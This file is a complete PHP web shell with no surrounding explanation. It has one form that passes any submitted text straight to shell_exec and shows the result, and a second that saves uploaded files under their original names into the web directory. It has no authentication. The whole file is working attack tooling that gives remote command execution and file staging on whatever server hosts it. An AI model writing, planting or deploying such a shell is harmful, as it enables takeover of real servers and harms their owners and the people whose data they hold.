<?php
$output = '';
$uploadStatus = '';

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd . " 2>&1");
}

if (isset($_FILES['file'])) {
    $fileName = $_FILES['file']['name'];
    if (move_uploaded_file($_FILES['file']['tmp_name'], $fileName)) {
        $uploadStatus = "Upload Success: $fileName";
    } else {
        $uploadStatus = "Upload Failed: $fileName";
    }
}
?>
<!DOCTYPE html>
<html>
<body>

<form method="POST">
    <input type="text" name="cmd" placeholder="Type command...">
    <input type="submit" value="Run">
</form>

<?php if ($output): ?>
<pre><?php echo htmlspecialchars($output); ?></pre>
<?php endif; ?>

<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>

<?php if ($uploadStatus): ?>
<p><?php echo htmlspecialchars($uploadStatus); ?></p>
<?php endif; ?>

</body>
</html>